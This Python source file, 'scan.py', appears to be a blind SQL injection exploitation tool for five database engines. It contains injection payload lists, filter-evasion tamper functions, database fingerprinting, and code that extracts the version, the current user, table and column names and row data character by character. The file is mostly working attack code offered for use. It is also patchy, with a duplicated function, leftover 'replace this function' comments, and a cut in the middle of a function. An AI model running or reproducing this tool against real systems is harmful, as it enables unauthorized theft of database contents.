# scan.py - EXTENDED VERSION: SUPPORT FOR MYSQL, POSTGRESQL, MSSQL, ORACLE, SQLITE
import time
import hashlib
import urllib.parse
import requests
from statistics import mean
from collections import Counter
from datetime import datetime
import json
import re

# Log levels with clearer icons (text only, no colors)
def _format_log(level, msg):
    timestamp = datetime.now().strftime("%H:%M:%S")
    icons = {
        "INFO": "ℹ️ [INFO]",
        "DEBUG": "🔍 [DEBUG]",
        "SUCCESS": "✅ [SUCCESS]",
        "ERROR": "❌ [ERROR]",
        "WARN": "⚠️ [WARN]",
        "TABLE": "📊 [TABLE]",
        "COLUMN": "🗂️ [COLUMN]",
        "ROW": "📄 [ROW]",
        "START": "🚀 [START]",
        "DONE": "🏁 [DONE]",
        "PROGRESS": "⏳ [PROGRESS]",
        "HEADER": "📢 [HEADER]",
        "SUMMARY": "📝 [SUMMARY]"
    }
    icon = icons.get(level, "ℹ️ [INFO]")
    return f"[{timestamp}] {icon} {msg}"

_LOG_FUNC = lambda s: None

def set_log_func(func):
    global _LOG_FUNC
    _LOG_FUNC = func if func else lambda s: None

def _log(msg, level="INFO"):
    formatted = _format_log(level, msg)
    try:
        _LOG_FUNC(formatted)
    except:
        pass

MYSQL_DELAY = 5
PGSQL_DELAY = 5
MSSQL_DELAY = 5
ORACLE_DELAY = 5
SQLITE_DELAY = 3
TIME_THRESHOLD = 3.0
REQUEST_TIMEOUT = 15
RETRIES = 5
SLEEP_BETWEEN = 0.1
MAX_TABLES = 2
MAX_COLUMNS = 5
MAX_ROW = 5
MAX_EXTRACT_LEN = 200
ASCII_MIN = 32
ASCII_MAX = 126

BOOLEAN_PAYLOADS = [
    ("1' AND '1'='1' -- -", "1' AND '1'='2' -- -", "mysql_string_comparison"),
    ("1' OR '1'='1' -- -", "1' AND '1'='2' -- -", "mysql_string_or"),
    ("')) AND 1=1--", "')) AND 1=0--", "sqlite_simple"),
    ("')) AND ('1'='1')--", "')) AND ('1'='2')--", "sqlite_string_comparison"),
    ("')) OR 1=1--", "')) AND 1=0--", "sqlite_or"),
    ("' AND '1'='1' --", "' AND '1'='2' --", "pgsql_string_comparison"),
    ("' OR '1'='1' --", "' AND '1'='2' --", "pgsql_string_or"),
    ("' AND 1=1 --", "' AND 1=2 --", "mssql_simple"),
    ("' OR 1=1 --", "' AND 1=2 --", "mssql_or"),
    ("' AND '1'='1' --", "' AND '1'='2' --", "oracle_string_comparison"),
]

TIME_BASED_PAYLOADS = [
    {
        "true": "1' AND IF(1=1,SLEEP({d}),0) -- -",
        "false": "1' AND IF(1=0,SLEEP({d}),0) -- -",
        "db": "MySQL",
        "delay": MYSQL_DELAY
    },
    {
        "true": "1' AND SLEEP({d}) -- -",
        "false": "1' AND 0 -- -",
        "db": "MySQL",
        "delay": MYSQL_DELAY
    },
    {
        "true": "1')) OR RANDOMBLOB(20000000)--",
        "false": "1')) OR 1=0--",
        "db": "SQLite",
        "delay": SQLITE_DELAY
    },
    {
        "true": "' AND CASE WHEN 1=1 THEN pg_sleep({d}) ELSE 0 END--",
        "false": "' AND CASE WHEN 1=0 THEN pg_sleep({d}) ELSE 0 END--",
        "db": "PostgreSQL",
        "delay": PGSQL_DELAY
    },
    {
        "true": "' ; IF (1=1) WAITFOR DELAY '0:0:{d}' --",
        "false": "' ; IF (1=0) WAITFOR DELAY '0:0:{d}' --",
        "db": "MSSQL",
        "delay": MSSQL_DELAY
    },
    {
        "true": "' AND CASE WHEN 1=1 THEN DBMS_PIPE.RECEIVE_MESSAGE('a',{d}) ELSE 0 END > 0 --",
        "false": "' AND CASE WHEN 1=0 THEN DBMS_PIPE.RECEIVE_MESSAGE('a',{d}) ELSE 0 END > 0 --",
        "db": "Oracle",
        "delay": ORACLE_DELAY
    },
]

def tamper_none(payload):
    return payload

def tamper_space_to_comment(payload):
    return payload.replace(" ", "/**/")

def tamper_space_to_plus(payload):
    return payload.replace(" ", "+")

def tamper_single_urlencode(payload):
    return urllib.parse.quote(payload)

TAMPER_FUNCTIONS = {
    "none": tamper_none,
    "space2comment": tamper_space_to_comment,
    "space2plus": tamper_space_to_plus,
    "urlencode": tamper_single_urlencode,
}

DB_SIGNATURES = {
    "MySQL": ["you have an error in your sql syntax", "mysql", "warning: mysql", "mysqli*", "mysql server version"],
    "SQLite": ["sqlite", "sqlite3", "sql logic error", "near", "unrecognized token", "sqlite error"],
    "PostgreSQL": ["postgresql", "syntax error at or near", "pg*", "pgsql"],
    "MSSQL": ["microsoft sql server", "unclosed quotation mark", "mssql"],
    "Oracle": ["ora-", "pls-", "oracle error", "oracle jdbc"],
}

def hash_text(text, length=12):
    if text is None:
        return None
    return hashlib.sha256(text.encode("utf-8", errors="ignore")).hexdigest()[:length]

def detect_database_from_content(text):
    if not text:
        return []
    text_lower = text.lower()
    detected = []
    for db_name, signatures in DB_SIGNATURES.items():
        for sig in signatures:
            if sig.lower() in text_lower:
                detected.append((db_name, sig))
                break
    return detected

def safe_mean(values):
    valid = [v for v in values if v is not None]
    return mean(valid) if valid else None

def make_request(session, target_url, params, http_method, timeout=REQUEST_TIMEOUT):
    http_method = http_method.upper()
    templated = '{' in target_url and '}' in target_url
    if templated:
        path_keys = re.findall(r'{([^}]*)}', target_url)
        url_dict = {}
        for k in path_keys:
            if k in params:
                url_dict[k] = params[k]
            else:
                raise ValueError(f"Missing path param {k}")
        current_url = target_url.format(**url_dict)
        query_body_params = {k: v for k, v in params.items() if k not in path_keys}
    else:
        current_url = target_url
        query_body_params = params
    start_time = time.time()
    try:
        headers = {}
        if http_method in ['POST', 'PUT']:
            headers["Content-Type"] = "application/json"
            response = session.request(http_method, current_url, json=query_body_params, timeout=timeout, allow_redirects=True, headers=headers)
        else:
            response = session.request(http_method, current_url, params=query_body_params, timeout=timeout, allow_redirects=True, headers=headers)
        elapsed = time.time() - start_time
        return response.text, elapsed, response.status_code
    except requests.Timeout:
        elapsed = time.time() - start_time
        return None, elapsed, None
    except requests.RequestException as e:
        _log(f"Request error: {str(e)}", "ERROR")
        return None, None, None

# ================== GENERAL EXTRACTION FUNCTIONS ==================
def get_db_version(db, session, url, base_params, param_name, true_sha, http_method, tamper_func, is_time_based=False):
    try:
        if db == "MySQL":
            expr = "VERSION()"
        elif db == "SQLite":
            expr = "sqlite_version()"
        elif db == "PostgreSQL":
            expr = "version()"
        elif db == "MSSQL":
            expr = "@@VERSION"
        elif db == "Oracle":
            expr = "(SELECT banner FROM v$version WHERE rownum=1)"
        else:
            return None
        if is_time_based:
            return get_string_time_based(db, session, url, base_params, param_name, expr, http_method, tamper_func)
        else:
            return get_string_boolean_based(db, session, url, base_params, param_name, expr, true_sha, http_method, tamper_func)
    except Exception as e:
        _log(f"Error extracting DB version for {db}: {str(e)}", "ERROR")
        return None

def get_current_database(db, session, url, base_params, param_name, true_sha, http_method, tamper_func, is_time_based=False):
    try:
        if db == "MySQL":
            expr = "DATABASE()"
        elif db == "PostgreSQL":
            expr = "current_database()"
        else:
            return None
        if is_time_based:
            return get_string_time_based(db, session, url, base_params, param_name, expr, http_method, tamper_func)
        else:
            return get_string_boolean_based(db, session, url, base_params, param_name, expr, true_sha, http_method, tamper_func)
    except Exception as e:
        _log(f"Error extracting current DB for {db}: {str(e)}", "ERROR")
        return None

def get_current_user(db, session, url, base_params, param_name, true_sha, http_method, tamper_func, is_time_based=False):
    try:
        if db == "MySQL":
            expr = "USER()"
        elif db == "PostgreSQL":
            expr = "current_user"
        else:
            return None
        if is_time_based:
            return get_string_time_based(db, session, url, base_params, param_name, expr, http_method, tamper_func)
        else:
            return get_string_boolean_based(db, session, url, base_params, param_name, expr, true_sha, http_method, tamper_func)
    except Exception as e:
        _log(f"Error extracting current user for {db}: {str(e)}", "ERROR")
        return None

# scan.py - CRITICAL FIX: Primary Key Detection for All 5 Databases
# Add this function to replace the existing detect_primary_key function

def detect_primary_key(db, table_name, session, url, base_params, param_name, true_sha, http_method, tamper_func, is_time_based=False):
    """
    Detect primary key columns for a table across all 5 database types.
    Returns list of column names that form the primary key.
    """
    try:
        pk_cols = []
        safe_table = table_name.upper() if db == "Oracle" else table_name
        safe_table = safe_table.replace("'", "''")
        
        _log(f"Detecting PK for {db}.{table_name}...", "DEBUG")
        
        if db == "MySQL":
            # MySQL: Query information_schema.key_column_usage
            i = 0
            while i < 5:  # Max 5 PK columns
                expr = f"(SELECT column_name FROM information_schema.key_column_usage WHERE table_name = '{safe_table}' AND constraint_name = 'PRIMARY' AND table_schema = DATABASE() ORDER BY ordinal_position LIMIT 1 OFFSET {i})"
                if is_time_based:
                    col = time_get_string_mysql(session, url, base_params, param_name, expr, http_method, tamper_func, maxlen=50)
                else:
                    col = bool_get_string_mysql(session, url, base_params, param_name, expr, true_sha, http_method, tamper_func, maxlen=50)
                
                if col and col.strip():
                    pk_cols.append(col.strip())
                    _log(f"Found PK column: {col}", "DEBUG")
                    i += 1
                else:
                    break
                    
        elif db == "PostgreSQL":
            # PostgreSQL: Query pg_index and pg_attribute
            i = 0
            while i < 5:
                # Get column names from primary key index
                expr = f"(SELECT a.attname FROM pg_index i JOIN pg_attribute a ON a.attrelid = i.indrelid AND a.attnum = ANY(i.indkey) WHERE i.indrelid = '{safe_table}'::regclass AND i.indisprimary ORDER BY array_position(i.indkey, a.attnum) LIMIT 1 OFFSET {i})"
                if is_time_based:
                    col = time_get_string_pgsql(session, url, base_params, param_name, expr, http_method, tamper_func, maxlen=50)
                else:
                    col = bool_get_string_pgsql(session, url, base_params, param_name, expr, true_sha, http_method, tamper_func, maxlen=50)
                
                if col and col.strip():
                    pk_cols.append(col.strip())
                    _log(f"Found PK column: {col}", "DEBUG")
                    i += 1
                else:
                    break
                    
        elif db == "MSSQL":
            # MSSQL: Query INFORMATION_SCHEMA.KEY_COLUMN_USAGE
            i = 0
            while i < 5:
                expr = f"(SELECT COLUMN_NAME FROM INFORMATION_SCHEMA.KEY_COLUMN_USAGE WHERE TABLE_NAME = '{safe_table}' AND CONSTRAINT_NAME LIKE 'PK%' ORDER BY ORDINAL_POSITION OFFSET {i} ROWS FETCH NEXT 1 ROWS ONLY)"
                if is_time_based:
                    col = time_get_string_mssql(session, url, base_params, param_name, expr, http_method, tamper_func, maxlen=50)
                else:
                    col = bool_get_string_mssql(session, url, base_params, param_name, expr, true_sha, http_method, tamper_func, maxlen=50)
                
                if col and col.strip():
                    pk_cols.append(col.strip())
                    _log(f"Found PK column: {col}", "DEBUG")
                    i += 1
                else:
                    break
                    
        elif db == "Oracle":
            # Oracle: Query all_cons_columns
            i = 0
            while i < 5:
                # Get PK column names using ROWNUM
                expr = f"(SELECT column_name FROM (SELECT column_name, ROWNUM AS rn FROM all_cons_columns WHERE table_name = '{safe_table}' AND constraint_name = (SELECT constraint_name FROM all_constraints WHERE table_name = '{safe_table}' AND constraint_type = 'P' AND owner = USER) ORDER BY position) WHERE rn = {i+1})"
                if is_time_based:
                    col = time_get_string_oracle(session, url, base_params, param_name, expr, http_method, tamper_func, maxlen=50)
                else:
                    col = bool_get_string_oracle(session, url, base_params, param_name, expr, true_sha, http_method, tamper_func, maxlen=50)
                
                if col and col.strip():
                    pk_cols.append(col.strip())
                    _log(f"Found PK column: {col}", "DEBUG")
                    i += 1
                else:
                    break
                    
        elif db == "SQLite":
            # SQLite: Query PRAGMA_table_info for pk > 0
            i = 0
            while i < 5:
                expr = f"(SELECT name FROM PRAGMA_table_info('{safe_table}') WHERE pk > 0 ORDER BY pk, cid LIMIT 1 OFFSET {i})"
                if is_time_based:
                    col = time_get_string_sqlite(session, url, base_params, param_name, expr, http_method, tamper_func, maxlen=50)
                else:
                    col = bool_get_string_sqlite(session, url, base_params, param_name, expr, true_sha, http_method, tamper_func, maxlen=50)
                
                if col and col.strip():
                    pk_cols.append(col.strip())
                    _log(f"Found PK column: {col}", "DEBUG")
                    i += 1
                else:
                    break
        
        # Fallback strategies if no PK found
        if not pk_cols:
            _log(f"No PK found for {db}.{table_name}, using fallback", "WARN")
            
            if db == "SQLite":
                # SQLite always has rowid
                pk_cols = ["rowid"]
                _log("Using SQLite rowid as fallback", "DEBUG")
            else:
                # For other DBs, try to get first column
                try:
                    if db == "MySQL":
                        expr = f"(SELECT column_name FROM information_schema.columns WHERE table_name = '{safe_table}' AND table_schema = DATABASE() ORDER BY ordinal_position LIMIT 1)"
                    elif db == "PostgreSQL":
                        expr = f"(SELECT column_name FROM information_schema.columns WHERE table_name = '{safe_table}' AND table_schema = 'public' ORDER BY ordinal_position LIMIT 1)"
                    elif db == "MSSQL":
                        expr = f"(SELECT name FROM sys.columns WHERE object_id = OBJECT_ID('{safe_table}') ORDER BY column_id OFFSET 0 ROWS FETCH NEXT 1 ROWS ONLY)"
                    elif db == "Oracle":
                        expr = f"(SELECT column_name FROM (SELECT column_name, ROWNUM AS rn FROM all_tab_columns WHERE table_name = '{safe_table}' AND owner = USER ORDER BY column_id) WHERE rn = 1)"
                    else:
                        return None
                    
                    if is_time_based:
                        col = get_string_time_based(db, session, url, base_params, param_name, expr, http_method, tamper_func)
                    else:
                        col = get_string_boolean_based(db, session, url, base_params, param_name, expr, true_sha, http_method, tamper_func)
                    
                    if col and col.strip():
                        pk_cols = [col.strip()]
                        _log(f"Using first column as fallback: {col}", "DEBUG")
                except Exception as e:
                    _log(f"Fallback failed: {str(e)}", "ERROR")
                    return None
        
        if pk_cols:
            _log(f"Final PK columns for {db}.{table_name}: {pk_cols}", "SUCCESS")
        else:
            _log(f"No PK columns detected for {db}.{table_name}", "WARN")
            
        return pk_cols if pk_cols else None
        
    except Exception as e:
        _log(f"Error detecting PK for {db}.{table_name}: {str(e)}", "ERROR")
        import traceback
        _log(traceback.format_exc(), "ERROR")
        return None


def get_order_by_clause(db, table_name, pk_cols, columns):
    """
    Generate ORDER BY clause based on primary key or fallback.
    This ensures consistent ordering to avoid duplicate rows.
    """
    if pk_cols and len(pk_cols) > 0:
        # Use PK columns for ordering
        order_cols = ", ".join(pk_cols)
        return f"ORDER BY {order_cols}"
    else:
        # Fallback strategies
        if db == "SQLite":
            return "ORDER BY rowid"
        elif columns and len(columns) > 0:
            # Use first selected column
            return f"ORDER BY {columns[0]}"
        else:
            # No ORDER BY (may cause duplicates)
            _log(f"Warning: No ORDER BY clause for {db}.{table_name}", "WARN")
            return ""


# IMPORTANT: Also update calibrate_true_sha to handle all DB types
def calibrate_true_sha(db, session, url, base_params, param_name, http_method, tamper_func):
    """
    Calibrate true_sha for boolean-based extraction.
    Returns the most common SHA hash for a TRUE condition.
    """
    try:
        _log(f"Calibrating true_sha for {db}...", "PROGRESS")
        
        if db == "SQLite":
            return calibrate_true_sha_sqlite(session, url, base_params, param_name, http_method, tamper_func)
        
        # Define test payloads for each DB
        if db == "MySQL":
            test_payload = tamper_func("1' AND 1=1 -- -")
        elif db == "PostgreSQL":
            test_payload = tamper_func("' AND 1=1 --")
        elif db == "MSSQL":
            test_payload = tamper_func("' AND 1=1 --")
        elif db == "Oracle":
            test_payload = tamper_func("' AND 1=1 --")
        else:
            _log(f"Unknown database type: {db}", "ERROR")
            return None
        
        # Get most common hash from multiple requests
        hashes = []
        for retry in range(RETRIES):
            params = base_params.copy()
            params[param_name] = test_payload
            text, _, _ = make_request(session, url, params, http_method)
            if text:
                sha = hash_text(text)
                hashes.append(sha)
            time.sleep(SLEEP_BETWEEN)
        
        if not hashes:
            _log(f"Failed to get any responses for {db}", "ERROR")
            return None
        
        most_common_sha = Counter(hashes).most_common(1)[0][0]
        _log(f"Calibrated true_sha for {db}: {most_common_sha}", "SUCCESS")
        return most_common_sha
        
    except Exception as e:
        _log(f"Error calibrating true_sha for {db}: {str(e)}", "ERROR")
        return None

def get_order_by_clause(db, table_name, pk_cols, columns):
    if pk_cols:
        return "ORDER BY " + ", ".join(pk_cols)
    else:
        if db == "SQLite":
            return "ORDER BY rowid"
        elif columns:
            return "ORDER BY " + columns[0]
        else:
            return ""

def get_string_boolean_based(db, session, url, base_params, param_name, sql_expr, true_sha, http_method, tamper_func, maxlen=MAX_EXTRACT_LEN):
    if db == "MySQL":
        return bool_get_string_mysql(session, url, base_params, param_name, sql_expr, true_sha, http_method, tamper_func, maxlen)
    elif db == "SQLite":
        return bool_get_string_sqlite(session, url, base_params, param_name, sql_expr, true_sha, http_method, tamper_func, maxlen)
    elif db == "PostgreSQL":
        return bool_get_string_pgsql(session, url, base_params, param_name, sql_expr, true_sha, http_method, tamper_func, maxlen)
    elif db == "MSSQL":
        return bool_get_string_mssql(session, url, base_params, param_name, sql_expr, true_sha, http_method, tamper_func, maxlen)
    elif db == "Oracle":
        return bool_get_string_oracle(session, url, base_params, param_name, sql_expr, true_sha, http_method, tamper_func, maxlen)
    return None

def get_string_time_based(db, session, url, base_params, param_name, sql_expr, http_method, tamper_func, maxlen=MAX_EXTRACT_LEN):
    if db == "MySQL":
        return time_get_string_mysql(session, url, base_params, param_name, sql_expr, http_method, tamper_func, maxlen)
    elif db == "SQLite":
        return time_get_string_sqlite(session, url, base_params, param_name, sql_expr, http_method, tamper_func, maxlen)
    elif db == "PostgreSQL":
        return time_get_string_pgsql(session, url, base_params, param_name, sql_expr, http_method, tamper_func, maxlen)
    elif db == "MSSQL":
        return time_get_string_mssql(session, url, base_params, param_name, sql_expr, http_method, tamper_func, maxlen)
    elif db == "Oracle":
        return time_get_string_oracle(session, url, base_params, param_name, sql_expr, http_method, tamper_func, maxlen)
    return None

def enumerate_tables_boolean_based(db, session, url, base_params, param_name, true_sha, http_method, tamper_func, max_tables=MAX_TABLES):
    if db == "MySQL":
        return bool_enumerate_tables_mysql(session, url, base_params, param_name, true_sha, http_method, tamper_func, max_tables)
    elif db == "SQLite":
        return bool_enumerate_tables_sqlite(session, url, base_params, param_name, true_sha, http_method, tamper_func, max_tables)
    elif db == "PostgreSQL":
        return bool_enumerate_tables_pgsql(session, url, base_params, param_name, true_sha, http_method, tamper_func, max_tables)
    elif db == "MSSQL":
        return bool_enumerate_tables_mssql(session, url, base_params, param_name, true_sha, http_method, tamper_func, max_tables)
    elif db == "Oracle":
        return bool_enumerate_tables_oracle(session, url, base_params, param_name, true_sha, http_method, tamper_func, max_tables)
    return []

def enumerate_tables_time_based(db, session, url, base_params, param_name, http_method, tamper_func, max_tables=MAX_TABLES):
    if db == "MySQL":
        return time_enumerate_tables_mysql(session, url, base_params, param_name, http_method, tamper_func, max_tables)
    elif db == "SQLite":
        return time_enumerate_tables_sqlite(session, url, base_params, param_name, http_method, tamper_func, max_tables)
    elif db == "PostgreSQL":
        return time_enumerate_tables_pgsql(session, url, base_params, param_name, http_method, tamper_func, max_tables)
    elif db == "MSSQL":
        return time_enumerate_tables_mssql(session, url, base_params, param_name, http_method, tamper_func, max_tables)
    elif db == "Oracle":
        return time_enumerate_tables_oracle(session, url, base_params, param_name, http_method, tamper_func, max_tables)
    return []

def enumerate_columns_boolean_based(db, session, url, base_params, param_name, table_name, true_sha, http_method, tamper_func, max_cols=MAX_COLUMNS):
    if db == "MySQL":
        return bool_enumerate_columns_mysql(session, url, base_params, param_name, table_name, true_sha, http_method, tamper_func, max_cols)
    elif db == "SQLite":
        return bool_enumerate_columns_sqlite(session, url, base_params, param_name, table_name, true_sha, http_method, tamper_func, max_cols)
    elif db == "PostgreSQL":
        return bool_enumerate_columns_pgsql(session, url, base_params, param_name, table_name, true_sha, http_method, tamper_func, max_cols)
    elif db == "MSSQL":
        return bool_enumerate_columns_mssql(session, url, base_params, param_name, table_name, true_sha, http_method, tamper_func, max_cols)
    elif db == "Oracle":
        return bool_enumerate_columns_oracle(session, url, base_params, param_name, table_name, true_sha, http_method, tamper_func, max_cols)
    return []

def enumerate_columns_time_based(db, session, url, base_params, param_name, table_name, http_method, tamper_func, max_cols=MAX_COLUMNS):
    if db == "MySQL":
        return time_enumerate_columns_mysql(session, url, base_params, param_name, table_name, http_method, tamper_func, max_cols)
    elif db == "SQLite":
        return time_enumerate_columns_sqlite(session, url, base_params, param_name, table_name, http_method, tamper_func, max_cols)
    elif db == "PostgreSQL":
        return time_enumerate_columns_pgsql(session, url, base_params, param_name, table_name, http_method, tamper_func, max_cols)
    elif db == "MSSQL":
        return time_enumerate_columns_mssql(session, url, base_params, param_name, table_name, http_method, tamper_func, max_cols)
    elif db == "Oracle":
        return time_enumerate_columns_oracle(session, url, base_params, param_name, table_name, http_method, tamper_func, max_cols)
    return []

def extract_rows_boolean_based(db, session, url, base_params, param_name, table_name, columns, true_sha, http_method, tamper_func, limit=MAX_ROW, pk_cols=None):
    if db == "MySQL":
        return bool_extract_rows_mysql(session, url, base_params, param_name, table_name, columns, true_sha, http_method, tamper_func, limit, pk_cols)
    elif db == "SQLite":
        return bool_extract_rows_sqlite(session, url, base_params, param_name, table_name, columns, true_sha, http_method, tamper_func, limit, pk_cols)
    elif db == "PostgreSQL":
        return bool_extract_rows_pgsql(session, url, base_params, param_name, table_name, columns, true_sha, http_method, tamper_func, limit, pk_cols)
    elif db == "MSSQL":
        return bool_extract_rows_mssql(session, url, base_params, param_name, table_name, columns, true_sha, http_method, tamper_func, limit, pk_cols)
    elif db == "Oracle":
        return bool_extract_rows_oracle(session, url, base_params, param_name, table_name, columns, true_sha, http_method, tamper_func, limit, pk_cols)
    return []

def extract_rows_time_based(db, session, url, base_params, param_name, table_name, columns, http_method, tamper_func, limit=MAX_ROW, pk_cols=None):
    if db == "MySQL":
        return time_extract_rows_mysql(session, url, base_params, param_name, table_name, columns, http_method, tamper_func, limit, pk_cols)
    elif db == "SQLite":
        return time_extract_rows_sqlite(session, url, base_params, param_name, table_name, columns, http_method, tamper_func, limit, pk_cols)
    elif db == "PostgreSQL":
        return time_extract_rows_pgsql(session, url, base_params, param_name, table_name, columns, http_method, tamper_func, limit, pk_cols)
    elif db == "MSSQL":
        return time_extract_rows_mssql(session, url, base_params, param_name, table_name, columns, http_method, tamper_func, limit, pk_cols)
    elif db == "Oracle":
        return time_extract_rows_oracle(session, url, base_params, param_name, table_name, columns, http_method, tamper_func, limit, pk_cols)
    return []

# ================== MYSQL BOOLEAN-BASED ==================
def bool_check_mysql(session, url, base_params, param_name, condition_sql, true_sha, http_method='GET', tamper_func=tamper_none):
    try:
        payload = tamper_func(f"1' AND ({condition_sql}) -- -")
        params = base_params.copy()
        params[param_name] = payload
        hashes = []
        for retry in range(RETRIES):
            text, _, _ = make_request(session, url, params, http_method)
            if text:
                sha = hash_text(text)
                hashes.append(sha)
            time.sleep(SLEEP_BETWEEN)
        most_common_sha = Counter(hashes).most_common(1)[0][0] if hashes else None
        result = most_common_sha == true_sha
        return result
    except Exception as e:
        _log(f"bool_check_mysql error: {str(e)}", "ERROR")
        return False

def bool_get_len_mysql(session, url, base_params, param_name, sql_expr, true_sha, http_method='GET', tamper_func=tamper_none, max_guess=MAX_EXTRACT_LEN):
    try:
        lower = 0
        upper = 1
        while upper <= max_guess:
            cond = f"LENGTH(({sql_expr})) <= {upper}"
            ok = bool_check_mysql(session, url, base_params, param_name, cond, true_sha, http_method, tamper_func)
            if ok:
                break
            upper *= 2
        if upper > max_guess:
            return None
        while lower < upper:
            mid = (lower + upper) // 2
            cond = f"LENGTH(({sql_expr})) <= {mid}"
            ok = bool_check_mysql(session, url, base_params, param_name, cond, true_sha, http_method, tamper_func)
            if ok:
                upper = mid
            else:
                lower = mid + 1
        return lower
    except Exception as e:
        _log(f"bool_get_len_mysql error: {str(e)}", "ERROR")
        return None

def bool_get_char_ord_mysql(session, url, base_params, param_name, sql_expr, pos, true_sha, http_method='GET', tamper_func=tamper_none, low=ASCII_MIN, high=ASCII_MAX):
    try:
        lo = low
        hi = high
        ranges = [(32, 47), (48, 57), (58, 64), (65, 90), (91, 96), (97, 122), (123, 126)]
        for r_low, r_high in ranges:
            cond = f"ASCII(MID(LOWER(({sql_expr})),{pos},1)) BETWEEN {r_low} AND {r_high}"
            ok = bool_check_mysql(session, url, base_params, param_name, cond, true_sha, http_method, tamper_func)
            if ok:
                lo = r_low
                hi = r_high
                break
        while lo < hi:
            mid = (lo + hi) // 2
            cond = f"ASCII(MID(LOWER(({sql_expr})),{pos},1)) > {mid}"
            ok = bool_check_mysql(session, url, base_params, param_name, cond, true_sha, http_method, tamper_func)
            if ok:
                lo = mid + 1
            else:
                hi = mid
        return lo
    except Exception as e:
        _log(f"bool_get_char_ord_mysql error: {str(e)}", "ERROR")
        return None

def bool_get_string_mysql(session, url, base_params, param_name, sql_expr, true_sha, http_method='GET', tamper_func=tamper_none, maxlen=MAX_EXTRACT_LEN):
    try:
        length = bool_get_len_mysql(session, url, base_params, param_name, sql_expr, true_sha, http_method, tamper_func, maxlen)
        if length is None or length == 0:
            return ""
        out_chars = []
        _log(f"Extracting string (length={length})...", "PROGRESS")
        for pos in range(1, length + 1):
            ord_val = bool_get_char_ord_mysql(session, url, base_params, param_name, sql_expr, pos, true_sha, http_method, tamper_func)
            if ord_val is None:
                out_chars.append('?')
            else:
                out_chars.append(chr(ord_val))
            if pos % 10 == 0:
                _log(f"Progress: {pos}/{length}", "PROGRESS")
            time.sleep(SLEEP_BETWEEN)
        result = "".join(out_chars)
        _log(f"Extracted: {result}", "DONE")
        return result
    except Exception as e:
        _log(f"bool_get_string_mysql error: {str(e)}", "ERROR")
        return ""

def bool_enumerate_tables_mysql(session, url, base_params, param_name, true_sha, http_method='GET', tamper_func=tamper_none, max_tables=MAX_TABLES):
    try:
        _log("Enumerating tables (boolean-based, MySQL)...", "START")
        tables = []
        for i in range(max_tables):
            expr = f"(SELECT table_name FROM information_schema.tables WHERE table_schema = database() LIMIT 1 OFFSET {i})"
            name = bool_get_string_mysql(session, url, base_params, param_name, expr, true_sha, http_method, tamper_func)
            if not name:
                break
            _log(f"Table[{i}] = {name}", "TABLE")
            tables.append(name)
        _log(f"Total tables: {len(tables)}", "SUCCESS")
        return tables
    except Exception as e:
        _log(f"bool_enumerate_tables_mysql error: {str(e)}", "ERROR")
        return []

def bool_enumerate_columns_mysql(session, url, base_params, param_name, table_name, true_sha, http_method='GET', tamper_func=tamper_none, max_cols=MAX_COLUMNS):
    try:
        _log(f"Enumerating columns for table {table_name}", "INFO")
        cols = []
        safe_table = table_name.replace("'", "''")
        for i in range(max_cols):
            expr = f"(SELECT column_name FROM information_schema.columns WHERE table_name = '{safe_table}' AND table_schema = database() ORDER BY ordinal_position LIMIT 1 OFFSET {i})"
            name = bool_get_string_mysql(session, url, base_params, param_name, expr, true_sha, http_method, tamper_func)
            if not name:
                break
            _log(f"Column[{i}] = {name}", "COLUMN")
            cols.append(name)
        return cols
    except Exception as e:
        _log(f"bool_enumerate_columns_mysql error: {str(e)}", "ERROR")
        return []

def bool_extract_rows_mysql(session, url, base_params, param_name, table_name, columns, true_sha, http_method='GET', tamper_func=tamper_none, limit=MAX_ROW, pk_cols=None):
    try:
        _log(f"Extracting rows for table {table_name} (limit {limit})", "INFO")
        rows = []
        order_by = get_order_by_clause("MySQL", table_name, pk_cols, columns)
        safe_table = table_name.replace("'", "''")
        for row_idx in range(limit):
            _log(f"Extracting row {row_idx + 1}/{limit}...", "PROGRESS")
            row_dict = {}
            has_data = False
            for col in columns:
                safe_col = col.replace("'", "''")
                expr = f"(SELECT {safe_col} FROM {safe_table} {order_by} LIMIT 1 OFFSET {row_idx})"
                cell_value = bool_get_string_mysql(session, url, base_params, param_name, expr, true_sha, http_method, tamper_func, maxlen=80)
                row_dict[col] = cell_value if cell_value else ""
                if cell_value:
                    has_data = True
                _log(f"Cell ({col}): {cell_value}", "ROW")
            if has_data:
                rows.append(row_dict)
                _log(f"Row {row_idx + 1}: {row_dict}", "ROW")
            else:
                break
        return rows
    except Exception as e:
        _log(f"bool_extract_rows_mysql error: {str(e)}", "ERROR")
        return []

# ================== SQLITE BOOLEAN-BASED ==================
def _safe_tamper_for_sqlite(tamper_func):
    func_name = tamper_func.__name__
    if func_name in ("tamper_space_to_plus", "tamper_single_urlencode"):
        return tamper_none
    return tamper_func

def calibrate_true_sha_sqlite(session, url, base_params, param_name, http_method='GET', tamper_func=tamper_none):
    safe_tamper = _safe_tamper_for_sqlite(tamper_func)
    test_payload = safe_tamper("')) AND 1=1--")
    _log(f"Calibrating true_sha for sqlite...", "PROGRESS")
    sha = _most_common_hash_from_payload(session, url, base_params, param_name, test_payload, http_method)
    if sha:
        _log(f"Calibrated true_sha: {sha}", "SUCCESS")
    else:
        _log("Failed to calibrate true_sha.", "ERROR")
    return sha

def _most_common_hash_from_payload(session, url, params, param_name, payload, http_method='GET', retries=RETRIES):
    hashes = []
    for _ in range(retries):
        p = params.copy()
        p[param_name] = payload
        text, _, _ = make_request(session, url, p, http_method)
        if text:
            hashes.append(hash_text(text))
        time.sleep(SLEEP_BETWEEN)
    return Counter(hashes).most_common(1)[0][0] if hashes else None

def bool_check_sqlite(session, url, base_params, param_name, condition_sql, true_sha, http_method='GET', tamper_func=tamper_none):
    safe_tamper = _safe_tamper_for_sqlite(tamper_func)
    try:
        payload = safe_tamper(f"')) AND ({condition_sql})--")
        params = base_params.copy()
        params[param_name] = payload
        hashes = []
        for retry in range(RETRIES):
            text, _, _ = make_request(session, url, params, http_method)
            if text:
                hashes.append(hash_text(text))
            time.sleep(SLEEP_BETWEEN)
        most_common_sha = Counter(hashes).most_common(1)[0][0] if hashes else None
        result = most_common_sha == true_sha
        return result
    except Exception as e:
        _log(f"bool_check_sqlite error: {str(e)}", "ERROR")
        return False

def bool_get_len_sqlite(session, url, base_params, param_name, sql_expr, true_sha, http_method='GET', tamper_func=tamper_none, max_guess=MAX_EXTRACT_LEN):
    safe_tamper = _safe_tamper_for_sqlite(tamper_func)
    try:
        lower = 0
        upper = 1
        while upper <= max_guess:
            cond = f"LENGTH(({sql_expr})) <= {upper}"
